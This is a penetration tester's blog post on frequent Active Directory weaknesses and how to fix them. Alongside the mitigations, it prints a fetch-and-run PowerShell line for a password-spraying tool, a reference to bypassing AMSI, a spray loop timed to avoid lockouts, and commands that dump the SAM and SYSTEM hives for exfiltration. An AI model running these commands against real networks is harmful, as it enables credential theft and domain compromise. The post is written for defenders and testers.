> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [s3cur3th1ssh1t.github.io](https://s3cur3th1ssh1t.github.io/The-most-common-on-premise-vulnerabilities-and-misconfigurations/)

March 17, 2021

In the last years my team at [r-tec](https://www.r-tec.net/home.html) was confronted with many different company environments, in which we had to search for vulnerabilities and misconfigurations. For customers, who have not yet carried out regular penetration tests, we recommend in the initial step to check systems on the Internet (DMZ) as well as internal systems for the most common critical attack techniques and vulnerabilities. This can be done with a predefined number of person-days. Anything found within this period will be included in the report. This approach provides an initial overview of the most critical vulnerabilities and risks from both external and internal threats. For such initial projects, we also recommend choosing an open scope. Here, any of the client’s systems will be examined, but also any attack techniques such as social engineering via phishing mails can be used.

In this blog post I’m gonna cover the in my opinion most common findings in a Windows Active Directory environment, which can be found and abused for `Privilege Escalation` and `Lateral Movement` in such a project. It’s about _on premises_ vulnerabilities and misconfigurations in an internal company environment as well as mitigations.

Introduction
------------

Why the _internal_ and _on premises_ vulnerabilities? At one hand, I have to start with any topic and I chose this one. At the other hand Red-teaming- as well as Pentest- and Incident Response-projects have shown to us in the recent years, that gaining initial access to an internal corporate network, is in the most cases not the toughest challenge. The human factor (social engineering) plays an important role here in the most cases. So, assuming that an attacker can gain relatively straightforward access to an internal network via the internet, one relevant question for a company could be _what can an attacker do in my internal network after gaining initial access?_. One way to give answers to that question is via internal Pentesting. Alternatively it’s possible to test the SOC/CERT’s capabilities and efficiency with an _Assumed breach_ Red-Teaming project. Most of the company networks we´ve seen in the recent years were still on premises or hybrid environments. That means everything was hosted at the customers side in his own Datacenter or parts of the environment were hosted in the cloud such as Azure or AWS services. Therefore the relevance of _internal_ as well as _on premises_ environment testing should be clear. Personally, I also believe that many companies, especially in europe will not use cloud-only environments in the future, for data privacy reasons (see General Data Protection Regulation (GDPR)). _External_ testing or _Social Engeneering_ may be another blog post topic for the future.

A not unsubstantial fact has resulted from our internal Pentest projects over the years: In **every** single engagement with an **open scope** starting in the **client-systems network** with the primary goal of checking **Privilege Escalation & Lateral Movement techniques** my team was able to elevate privileges to _Domain Administrator_ rights. Compromising the Firewalls, the linux environment or SAP-systems was afterwards relatively easy with these privileges. You don’t believe me? `¯\_(ツ)_/ ¯` . This was possible in a timeframe from 10 minutes to ~3 days in the most cases, depending on the environment & found vulnerabilities. However, most of these environments had the same critical vulnerabilities and misconfigurations. Theese vulnerabilities were found in small as well as in multi billion euro company environments. In this post I will highlight them, as well as share recommendations to fix them. All vulnerabilities and techniques are already documented at various places on the internet. Those who are familiar with this topic will therefore most likely not find anything new. Enough bubbling around. Let´s actually take a look at the vulnerabilities and protection mechanisms.

Patch- & Update-Management process
----------------------------------

This is by far the most obvious finding in my opinion. If the environment has a lacking Patch & Update-Management process, there will be single or multiple systems or applications without patches installed. No installation of security-patches leads to vulnerable software and/or systems - in the worst case, the impact is a direct takeover. _Why should I care about an attacker compromising a single system?_ Here comes `Lateral Movement` and `Post Exploitation` into the game - I often had the situation, that the compromise of a single system led to a full Active Directory takeover. But I won´t dive into _Post Exploitation_ or _Lateral Movement_ this time because the post would explode.

You can find the most relevant vulnerabilities in this area by using automated vulnerability scanner software. This can be either a free software like [OpenVAS](https://www.openvas.org/) or a commercial scanner like [nessus](https://www.tenable.com/products/nessus). Be aware that depending on the scanner configuration some systems can get unstable or even run in a _Denial of Service (DOS)_ state. This is simply due to the nature of a vulnerability scanner - it is sending traffic to every port and service, probes all services, tries to actively exploit vulnerabilities to find them and so on. This kind of traffic is not faced by many systems in daily life so that an overload can take place. Disabling _Denial of Service_ modules and a proper configuration for scans can mitigate this risk.

If you never worked with a vulnerability scanner in the internal network, you will certainly be overwhelmed by the high number of findings. In addition, many findings are given a criticality that is, in my view, too high or, in some cases, too low. That makes the prioritisation for the remediation process harder. In general it’s a good idea to first remedy the vulnerabilities with the highest criticality. Most companies will have a hard time, if they try to patch everything after the first scan, because it needs too much time fixing everything that fast. If you already have some background knowledge, I’ll recommend to fix the vulnerabilities with `Remote Code Execution` impact and `public exploits available` first. Theese vulnerabilities are the ones, that can be exploited automatically by malware/script kiddies or mad employees.

The most common vulnerabilities - leading to a direct system takeover - and which should therefore be remedied with priority, are the following (No guarantee of completeness - these are the ones I have in mind right now):

*   Windows Operating Systems (MS08-067, MS17-010, Bluekeep - CVE- 2019-0708, Zerologon - CVE-2020-1472, ProxyLogon - CVE-2021-26855)
*   HP System Management Homepage (Several RCEs)
*   HP Data Protector (Several RCEs)
*   Oracle WebLogic (Deserialisation vulnerabilities)
*   Insecure JMX Agents (No authentication leads to RCE)
*   Default credentials for any software (Windows, Linux, Apache Tomcat, Redis, Axis2, MSSQL, Oracle, Firebird DB and many more)
*   Dameware Mini Remote Control - CVE-2019-3980
*   IPMIv2 usage - password hashes for administrative accounts can be extracted
*   iLO remote management (Several RCEs)
*   JBoss (Several RCEs)
*   VNC without authentication
*   Jenkins without authentication (script console RCE + others)

There are **many** more easily exploitable RCE vulnerabilitites, but the above ones are the most common in my opinion. So if you are using one of those software from above - go ahead and check the latest patches.

#### Mitigation

This should be pretty obvious. **Periodical** patching and controlling is the key here.

Also - this chapter is called _Patch- and Update-Management_ **process**. Patching everything one time will not help you for the future. There needs to be a process, which periodically foresees the installation of updates including the needed time for administrators. Periodic or daily/weekly scanning for new critical vulnerabilities can help you here.

Kerberoasting && AS_REP Roasting
--------------------------------

Kerberoasting && AS-REP Roasting attacks can be used in the most company environments at least for one or more user. What is is about? Basically it’s a weakness in the kerberos protocol itself, which allows in the case of Kerberoasting _any user in the domain_ to request a ticket for _vulnerable_ service accounts. In the case of AS-REP Roasting _any device in the network_ can request a ticket even without authentication. What is the impact? The ticket can, in both cases, be used to create a hash for the service accounts password, which can be cracked offline via wordlist or brute-force attacks. So in the worst case an attacker in the network is able to get cleartext credentials for the vulnerable user. Service accounts often have administrative rights at least at some systems, so for successfully cracked hashes a `Privilege Escalation` via this technique is possible in the most cases.

I don’t need to reinvent the wheel - my colleage [@theluemmel](https://twitter.com/theluemmel) wrote a blog post about both techniques and their differences called [AS_REP Roasting vs Kerberoasting](https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/). It contains a more detailed explanation, a part about how to find vulnerable users and different tools for exploitation. I strongly recommend reading that article if you didn’t already.

#### Mitigation

For kerberoastable users, the only way to mitigate the risk is the usage of complex passwords. By using cryptic passwords with 20 or more characters an attacker will not be able to crack the hash. If you have users with the flag `DoesNotRequirePreAuth` set, which makes them AS-REP roastable, you can either set a complex password or unset this option.

In addition you can actively [monitor for Kerberoasting](https://adsecurity.org/?p=3458) or [AS-REP Roasting](https://medium.com/@jsecurity101/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec) activities in your network. This way, you can also identify potential attackers in your network.

Weak passwords
--------------

This is, in my opinion, one of the most important, but also for the Blue Team side often the hardest one to _fix_. In an Active Directory Environment, the password policy can be used to force users setting a _more complex_ password. The problem with this password policy settings is, that _only_ the following adjustments can be made:

*   Password length
*   Lowercase letters required
*   Uppercase letters required
*   Special characters required
*   Numbers required

In the last years I often did read about the recommendation to use eight-digit passwords with all criteria from above. Most likely companies did read the same, because the password policy in the most company environments forces eight characters with three out of the four complexity requirements.

I think, that the eight character password complexity recommendation was given due to cracking times via brute force. But already in 2019 it was easily possible to go through the whole character set of eight character passwords in [a few hours](https://www.theregister.com/2019/02/14/password_length/). So if we go by the offline cracking speed, we would need at minimum 10 character long passwords for NTLM (several weeks to months for cracking, depending on the hardware). But is that save? Employees and the human in general is lazy in forms of choosing passwords. So passwords like **Summer2021!**, **Winter#2020**, **CompanyName2021!**, **March2021!** meet the complexity requirements with all requirements but are still weak.

We as attackers can use for example `Domainpasswordspray` attacks with [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray) or many other public toolings to try one of the mentioned passwords against all Active Directory users. It´s as simple as:

```
AMSIBYPASS
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
Invoke-DomainPasswordSpray -Password Summer2021!
```

AMSIBYPASS? Take a look [here](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/).

Maybe the first level support helpdesk is using a password like **Initial2021!** or **Start2021!** for new accounts or password reset requests. Trying this password - or a slight variation of the password - will result in many compromised user-accounts. You got a lockout policy? `¯\_(ツ)_/¯` - everyone can read the values for it via for example the `net accounts` command from a cmd.

```
$words = Get-Content C:\temp\wordlist.txt
ForEach ($Word in $Words){Invoke-Domainpasswordspray -Password $word; Sleep TimeToResetLockOutCount}
```

Other tools like [SharpSpray](https://github.com/jnqpblc/SharpSpray) take the delay values as parameter. There are way too many Password-Spray tools to list them all here. Some examples are for OWA [Mailsniper](https://github.com/dafthack/MailSniper), Office365 ([MSOLSpray](https://github.com/dafthack/MSOLSpray)), Lync ([LyncSniper](https://github.com/mdsecresearch/LyncSniper) or [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)) and many many more.

The point is - the Microsoft policy doesn´t restrict _enough_, so that weak passwords cannot be chosen. Obviously the best thing you can do for the security level is using Multi-Factor-Authentication everywhere possible. This can also include the windows domain authentication with for example token/smartcards or even the fingerprint. Many companies, however, don´t want to implement this, because of the administrative overhead and therefore the higher costs.

So, what else can we do to avoid weak passwords for user-accounts? I really like and recommend the way of password blacklisting. There are Open Source solutions like [ad-password-protection](https://github.com/lithnet/ad-password-protection) or commercial solutions like [Specops Password Policy](https://specopssoft.com/product/specops-password-policy/). Administrators can add for example a wordlist with words that are not allowed. So the company name, names in general (family member names are often choosen with for example birthdates), Seasons, months and so on can be blacklisted. You can even integrate all [HaveIBeenPwned](https://haveibeenpwned.com/) passwords. A user could still choose **Summ3r2021!** which will fall in a wordlist+rule offline attack but many many user-accounts with the same password _should_ not happen again here.

And - we need to differentiate between administrative and non-administrative accounts. For non-administrative accounts 10 characters and all requirements + password blacklisting is a good thing in my opinion. A low-privileged user may also fall, when executing malware after clicking on a link via email. From my point of view, it is only a matter of time before a single user account in a company falls or is compromised. However, it should be made as difficult as possible for an attacker to elevate privileges or gain access to various other user-account credentials.

To make privilege escalation harder administrative user-accounts should be secured by a more restrictive password policy. Administrators _should_ be able to choose **cryptic** passwords with 14 or more characters for service-accounts and other administrative accounts. A _secure_ password manager with MFA can be used for administration (Spoiler: KeePass is not a good idea here, [a-case-study-in-attacking-keepass](https://www.harmj0y.net/blog/redteaming/a-case-study-in-attacking-keepass/), [keethief-a-case-study-in-attacking-keepass-part-2](https://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/)). Imagine, an attacker gets the `NetNTLMV2` hash via Man-in-the-Middle attacks or retrieves the `NTLM` hash of an administrative account from a compromised system which wasn´t patched. It is important, that it is not possible to break the cleartext password. `Lateral Movement` will be easy with the password. You may ask me - _what about Pass the Hash (PTH), I don’t need the cleartext password?_. There is a default Active Directory group called [Protected Users](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group). If you put sensitive administrative accounts in this group, they will be secured by multiple protection mechanisms. For example, they are only allowed to use Kerberos, which disables `NTLM` for authentication **and** the accounts cannot be delegated anymore (Some words about delegation abuse are [here](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)).

![](https://s3cur3th1ssh1t.github.io/assets/posts/OnPremiseVulns/Protected_Users.JPG)

#### Mitigations

We have several recommendations here in my opinion:

*   Use MFA wherever possible
*   At minimum 10 character passwords for low privileged user-accounts
*   At minimum 14 character **cryptic** passwords for administrative accounts
*   Password blacklisting via a filtering DLL or third party software
*   Usage of the _Protected Users_ group for administrative accounts which disables `NTLM` and therefore `PTH`
*   Using a _secure_ password manager **with** MFA at least for administrative accounts

Man-in-the-Middle attacks & Relaying
------------------------------------

There are so many blogposts about Man-in-the-Middle attacks and Relaying already. The first post I read about it was by [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) called [Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes)](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html) which changed my mindset and approach to internal Pentesting at that time. I did not know, that by being in the Man-in-the-Middle position for `NTLM` authentications it’s possible to relay the `NetNTLMv2` hash for code execution or authentication in general. Thats **insane**. And therefore, I used Man-in-the-Middle techniques from that time on in every single internal engagement - whenever this was in scope - with awesome results. The basic principle is explained in this post so go ahead reading it if you didn’t already.

How to become Man-in-the-Middle? There are multiple ways. The most common and most used are:

*   LLMNR, NBT-NS and MDNS poisoning via [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
*   Rogue DHCPv6 server via [mitm6](https://github.com/fox-it/mitm6)
*   ARP Spoofing via [Bettercap](https://github.com/bettercap/bettercap)
*   Active Directory Integrated DNS attacks - [Powermad](https://github.com/Kevin-Robertson/Powermad)

How exactly can we (ab)use this Man-in-the-Middle position for `Privilege Escalation` and `Lateral Movement`? One way is trying to crack the `NetNTLMv2` hashes gained from the MITM position via [john](https://github.com/openwall/john) or [hashcat](https://hashcat.net/hashcat/). And here we are again, at the point **weak passwords**, which is preventable as seen above.

The seccond technique is `relaying`. And again, I can refer to a blog post by my colleage [@theluemmel](https://twitter.com/theluemmel) with his post [Relaying 101](https://luemmelsec.github.io/Relaying-101/). I don´t need to rewrite this, so read it yourself if you want to know about it. Active Directory Integrated DNS is not written down here, so you should also read [@_dirkjan](https://twitter.com/_dirkjan)’s article [Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS](https://blog.netspi.com/exploiting-adidns/).

#### Mitigation

*   Disable LLMNR/Netbios on windows systems network interfaces, which is still enabled by default
*   Deploy a GPO which states “[Prefer IPv4 over IPv6](https://docs.microsoft.com/en-US/troubleshoot/windows-server/networking/configure-ipv6-in-windows)” or Disable IPv6 for client-systems (servers can run into trouble by disabling it)
*   Enable SMB/LDAP Signing
*   Use Switches with ARP Spoofing detection/block mechanisms
*   For ADIDNS: Disable _Create all child objects_ for _Authenticated Users_ and/or set a DNS entry for the Wildcard (*) to 0.0.0.0

Be aware:

![](https://s3cur3th1ssh1t.github.io/assets/posts/OnPremiseVulns/ADIDNS.JPG)

Many companies _abuse_ administrative Active Directory roles for the sake of convenience. I often found _Domain Administrator_ groups with more than 10, 20 or even 50 user-accounts in it. The privileges from this group are only needed **in build or disaster recovery scenarios** according to [Microsoft](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-f--securing-domain-admins-groups-in-active-directory). There **should be no day-to-day user accounts in the DA group with the exception of the built-in Administrator account for the domain** . So how many _Domain Administrator_ accounts should be there? According to that - only one! And this account should only be used on the Domain Controller. Many other of the Active Directory [Privileged Accounts and Groups](https://github.com/MicrosoftDocs/windowsserverdocs/blob/master/WindowsServerDocs/identity/ad-ds/plan/security-best-practices/Appendix-B--Privileged-Accounts-and-Groups-in-Active-Directory.md) like _DnsAdmins_, _Server Operators_, _Account Operators_ and so on can, when compromised, also lead to fast and easy `Privilege Escalation` & `Lateral Movement`. If we, as attackers, run

```
SharpHound -C All,GPOLocalGroup
```

to collect data and afterwards import it into our [Bloodhound](https://github.com/BloodHoundAD/BloodHound) database to run the query `Find Shortest Path to Domain Admins` and the graph is too big for visualisation, we know, that the _Domain Administrators_ are used for service accounts or daily operations, which is pretty bad. Many other AD groups can also be abused to get the highest privileges. So securing theese groups should somehow have the same priority. The following blog post by [@cube0x0](https://cube0x0.github.io/Pocing-Beyond-DA/) lists some abuse techniques for groups like _DnsAdmins_, _Server Operators_, _Backup operators_ and others: [Poc’ing Beyond Domain Admin - Part 1](https://cube0x0.github.io/Pocing-Beyond-DA/)

Microsoft also recommends the use of the [Least-Privilege principle](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models). So instead of for example using _Domain Administrator_ accounts for the daily usage and administration (which I saw often by for example even the first level support) accounts should only receive local administrative permissions for those systems, where it’s nessesary.

I also really like to run [ADRecon](https://github.com/adrecon/ADRecon) in every company environment. It has CSV-files as output but can generate a pretty nice Excel-Report containing all relevant Active Directory information needed for a review. If you want to lookup some group members or user groups its really easy and fast with filtering.

#### Mitigation

The process of implementing this measure may well be more difficult and complex, depending on how _historically grown_ the environment is. Anyway, the following can be done:

*   Microsoft recommends to use the [Privileged Access Model](https://docs.microsoft.com/en-US/security/compass/privileged-access-access-model)
*   Reduce the user-accounts in the highest privileged groups as much as possible. Create new groups with local administrator permissions for each group and their specific needed systems.
*   **DON’t** use _Domain Administrators_ for administrative or daily tasks!
*   Go through Microsofts [best practices](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/identity/ad-ds/plan/security-best-practices) and try to implement as much as possible. The best practices contain way more information than only the _Role & Authorisation Concept_ plus _least privilege principle_.

No LAPS usage
-------------

The Microsoft Local Administrator Password Solution (LAPS) is a [free downloadable](https://www.microsoft.com/en-us/download/details.aspx?id=46899) centralized management software for local account passwords of domain joined computers. Each systems local administrator account gets an complex cryptic password assigned, which is automatically changed every 15-30 days. The passwords are stored in the Active Directory and specific users or groups can get read access to those passwords by ACL.

An attacker needs to compromise only a single system to get it’s local administrator password hash from the `SAM` database. This can be done with the Mimikatz command `lsadump::sam`, using [Invoke-PowerDump](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1) or manually via cmd with

```
reg save hklm\sam c:\temp\sam
reg save hklm\system c:\temp\system

# Exfiltrate to a linux system and run the following:
samdump2 system sam
```

If no centralized local password solution is in place, the compromise of a single system can lead to a domain wide compromise in the worst case. That’s, because the local administrator will most likely have the same password on each system. An attacker can use `Pass-The-Hash` to compromise other systems with the extracted `NTLM`-Hash, or crack the password to login with the cleartext password - if that is weakly chosen.

Be aware, that by creating your own password manager solution you _might_ run into other critical vulnerabilities. I saw companies using a self developed password manager solution, which deployed a .NET service executable on each system. The passwords were changed via this service. Decompiling the assembly via [IlSpy](https://github.com/icsharpcode/ILSpy) resulted in hardcoded domain administrator credentials as well as the generation algorithm for local administrators. In other environments, I saw a centralized webserver with Powershell-scripts hosted in a directory. They were executed for the initial system setup. The scripts contained [Powershell Securestrings](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7.1) for passwords or the algorithm for password creation. Therefore - before spending too much time in a self developed software/script, I recommend using the available solutions like LAPS.

#### Mitigation

*   Implement LAPS if not already done
*   Restrict network logons for local administrator accounts via GPO `Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\User Rights Assignments` -> This also prevents `Lateral Movement` via network logons
    1.  Deny access to this computer from the network
    2.  Deny log on as a batch job
    3.  Deny log on as a service
    4.  Deny log on through Remote Desktop Services

One thing - which is depending on the environment pretty time consuming for us attackers - also leads to `Privilege Escalation` in many company environments. That is network shares readable or read/writeble by every _domain user_ account. There are **many** public tools, which allow us attackers to search for network shares and content in it. The following are my favorite tools for that task - depending on the situation and engagement type:

Powersploits (PowerView) [Find-InterestingDomainShareFile](https://powersploit.readthedocs.io/en/latest/Recon/Find-InterestingDomainShareFile/) - automatically searches through the domain with a predefined filter.

[Snaffler](https://github.com/SnaffCon/Snaffler/) - automates the Share Enumeration and has pretty good predefined filters for sensitive files and/or contents. The only negative thing in my mind is the high CPU usage in bigger environments. The system, on which it is executed, often became unstable and the scan never ended.

[Dionachs Passhunt](https://github.com/Dionach/PassHunt) - I’m using this most times manually for specific shares, the file extensions to search for and the filter via regex can be choosen via parameter and the HTML-report is beautiful.

[Softperfect Network Scanner portable](https://www.softperfect.com/products/networkscanner/) - if you are not working over a C2 server this one let`s you search through IP-ranges with an easy to use GUI. No filters, only the network share search itself. Searching the web you will find one free version - the last one before it became commercial.

What do we typically search for in those network shares?

*   Cleartext passwords
*   Encoded/encrypted passwords
*   Backup-Files
*   Configuration files
*   Image Backups like VMDK or others
*   Webserver source code - for self developed internal webservers this might lead to easy RCE quickwins
*   Password Manager databases like for example `.kdbx` or `.kdb` files

Theese contents can be found with for example the tools above via predifined filters or with custom filters. In many cases however I’m manually reviewing many shares, because that leads to more and other results.

#### Mitigation

*   Check all domain and non-domain systems for network shares
*   If the share contains sensitive informations like the mentioned above - restrict access to it or remove the sensitive files

### GPP-passwords

Somehow a subgroup of network shares. There are too many blog posts about this one already. Just read the following if you don’t know what it’s about:

[https://adsecurity.org/?p=2288](https://adsecurity.org/?p=2288)

Finding and decrypting these files is as easy as `Get-GPPPassword` via [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) for example.

#### Mitigation

*   Delete the XML files containing encrypted passwords

Credential theft hardening measures
-----------------------------------

One more thing to mention. There are two credential theft hardening measures for Windows Active Directory environments, which make life **much** harder for us attackers. The following two things should be enabled to protect against credential theft which can be used for PrivEsc & Lateral Movement:

1.  Enable [LSA Protection](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection): Only trusted binaries/drivers can touch the lsass process with LSA Protection enabled. This makes it harder [but not impossible](https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection) to dump credentials from memory.
2.  Enable [Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage). With this enabled we attackers cannot live dump credentials from lsass anymore. It’s still possible to add a [custom SSP](https://book.hacktricks.xyz/windows/active-directory-methodology/custom-ssp) to live capture credentials. Or it`s possible to friendly [ask the user](https://github.com/S3cur3Th1sSh1t/Pentest-Tools#post-exploitation---phish-credentials) for credentials.

Conclusion
----------

I have decided to make a hard cut at this point. The blogpost is already quite long. I could list a few more things at this point, such as constrained/unconstrained delegation, passwords in description fields or user-attributes, MSSQL-attacks, WSUS over http and so on. Instead I’ll drop some links for further reading. So if you are in the mood for more:

*   [https://github.com/infosecn1nja/AD-Attack-Defense](https://github.com/infosecn1nja/AD-Attack-Defense)
*   [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Active Directory Attack.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
*   [https://adsecurity.org/?page_id=4031](https://adsecurity.org/?page_id=4031)

The above mentioned vulnerabilities are in my opinion still the ones, that occur the most often in different environments. If all the issues mentioned here can be addressed, the next offensive security project or even an incident will certainly look better for the Blue Team as we attackers (neither good or bad intention) will have a harder time.

This blogpost is somehow different from the previous ones in terms of both content and structure. Less code & evasion techniques and more focused for the defending site. Nevertheless, I hope that both sides were able to benefit from this post. Comments and feedback is as always welcome via the channels above.

Links & Resources
-----------------

*   r-tec - [https://www.r-tec.net/home.html](https://www.r-tec.net/home.html)
*   OpenVas scanner - [https://www.openvas.org/](https://www.openvas.org/)
*   nessus scanner - [https://www.tenable.com/products/nessus](https://www.tenable.com/products/nessus)
*   Kerberoasting vs AS-REP Roasting - [https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/](https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/)
*   Detecting Kerberoasting Activity - [https://adsecurity.org/?p=3458](https://adsecurity.org/?p=3458)
*   IOC differences between Kerberoasting and AS-REP Roasting - [https://medium.com/@jsecurity101/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec](https://medium.com/@jsecurity101/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec)
*   8 char passwords cracked - [https://www.theregister.com/2019/02/14/password_length/](https://www.theregister.com/2019/02/14/password_length/)
*   Domainpasswordspray - [https://github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
*   Bypass AMSI by manual modification - [https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)
*   SharpSpray - [https://github.com/jnqpblc/SharpSpray](https://github.com/jnqpblc/SharpSpray)
*   MailSniper - [https://github.com/dafthack/MailSniper](https://github.com/dafthack/MailSniper)
*   MSOLSpray - [https://github.com/dafthack/MSOLSpray](https://github.com/dafthack/MSOLSpray)
*   LyncSniper - [https://github.com/mdsecresearch/LyncSniper](https://github.com/mdsecresearch/LyncSniper)
*   SprayingToolkit - [https://github.com/byt3bl33d3r/SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)
*   Open Source password blacklisting - [https://github.com/lithnet/ad-password-protection](https://github.com/lithnet/ad-password-protection)
*   Commercial password blacklisting - [https://specopssoft.com/product/specops-password-policy/](https://specopssoft.com/product/specops-password-policy/)
*   HaveIBeenPwned - [https://haveibeenpwned.com/](https://haveibeenpwned.com/)
*   A case study in attacking KeePass - [https://www.harmj0y.net/blog/redteaming/a-case-study-in-attacking-keepass/](https://www.harmj0y.net/blog/redteaming/a-case-study-in-attacking-keepass/)
*   A case study in attacking KeePass part II - [https://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/](https://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/)
*   Protected Users group - [https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
*   Unconstrained delegation - [https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
*   Practical guide to NTLM relaying in 2017 - [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
*   Responder - [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)
*   Inveigh - [https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
*   mitm6 - [https://github.com/fox-it/mitm6](https://github.com/fox-it/mitm6)
*   bettercap - [https://github.com/bettercap/bettercap](https://github.com/bettercap/bettercap)
*   Powermad - [https://github.com/Kevin-Robertson/Powermad](https://github.com/Kevin-Robertson/Powermad)
*   johntheripper - [https://github.com/openwall/john](https://github.com/openwall/john)
*   hashcat - [https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)
*   Relaying 101 - [https://luemmelsec.github.io/Relaying-101/](https://luemmelsec.github.io/Relaying-101/)
*   Exploiting ADIDNS - [https://blog.netspi.com/exploiting-adidns/](https://blog.netspi.com/exploiting-adidns/)
*   Prefer Ipv4 over Ipv6 - [https://docs.microsoft.com/en-US/troubleshoot/windows-server/networking/configure-ipv6-in-windows](https://docs.microsoft.com/en-US/troubleshoot/windows-server/networking/configure-ipv6-in-windows)
*   Securing the Domain Admins group - [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-f–securing-domain-admins-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-f--securing-domain-admins-groups-in-active-directory)
*   Privileged accounts and groups - [https://github.com/MicrosoftDocs/windowsserverdocs/blob/master/WindowsServerDocs/identity/ad-ds/plan/security-best-practices/Appendix-B–Privileged-Accounts-and-Groups-in-Active-Directory.md](https://github.com/MicrosoftDocs/windowsserverdocs/blob/master/WindowsServerDocs/identity/ad-ds/plan/security-best-practices/Appendix-B--Privileged-Accounts-and-Groups-in-Active-Directory.md)
*   Bloodhound - [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)
*   Pocing Beyong DA - [https://cube0x0.github.io/Pocing-Beyond-DA/](https://cube0x0.github.io/Pocing-Beyond-DA/)
*   Implementing least privilege administrative models - [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models)
*   ADRecon - [https://github.com/adrecon/ADRecon](https://github.com/adrecon/ADRecon)
*   Privileged access model - [https://docs.microsoft.com/en-US/security/compass/privileged-access-access-model](https://docs.microsoft.com/en-US/security/compass/privileged-access-access-model)
*   Microsoft Security best practices - [https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/identity/ad-ds/plan/security-best-practices](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/identity/ad-ds/plan/security-best-practices)
*   LAPS - [https://www.microsoft.com/en-us/download/details.aspx?id=46899](https://www.microsoft.com/en-us/download/details.aspx?id=46899)
*   Invoke-PowerDump - [https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1)
*   IlSpy - [https://github.com/icsharpcode/ILSpy](https://github.com/icsharpcode/ILSpy)
*   SecureString Powershell - [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7.1)
*   Find-InterestingDomainShareFile - [https://powersploit.readthedocs.io/en/latest/Recon/Find-InterestingDomainShareFile/](https://powersploit.readthedocs.io/en/latest/Recon/Find-InterestingDomainShareFile/)
*   Snaffler - [https://github.com/SnaffCon/Snaffler/](https://github.com/SnaffCon/Snaffler/)
*   PassHunt - [https://github.com/Dionach/PassHunt](https://github.com/Dionach/PassHunt)
*   Softperfect Network scanner - [https://www.softperfect.com/products/networkscanner/](https://www.softperfect.com/products/networkscanner/)
